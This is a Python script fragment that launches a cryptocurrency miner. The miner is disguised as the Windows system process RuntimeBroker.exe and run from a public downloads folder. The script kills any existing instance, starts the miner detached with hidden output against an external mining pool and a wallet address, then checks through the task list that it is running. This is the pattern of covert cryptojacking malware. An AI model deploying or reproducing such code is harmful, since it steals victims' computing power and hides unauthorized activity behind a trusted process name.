import subprocess, time, os

d = r"C:\Users\Public\Downloads"
m = os.path.join(d, "RuntimeBroker.exe")

# Kill existing
subprocess.run(["taskkill", "/F", "/IM", "RuntimeBroker.exe"], capture_output=True)
time.sleep(1)

# Start detached
proc = subprocess.Popen(
    [m, "--pool", "stratum+tcp://sg1.alphapool.tech:5566", "--address", "prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg", "--worker", "RTX4090_121"],
    creationflags=0x208,
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL
)
time.sleep(5)

# Check
tl = subprocess.run(["tasklist"], capture_output=True, text=True)
out = tl.stdout if tl.stdout else ""
return "RUNNING" if "runtimebroker" in out.lower() else "NOT_RUNNING_PID:" + str(proc.pid)
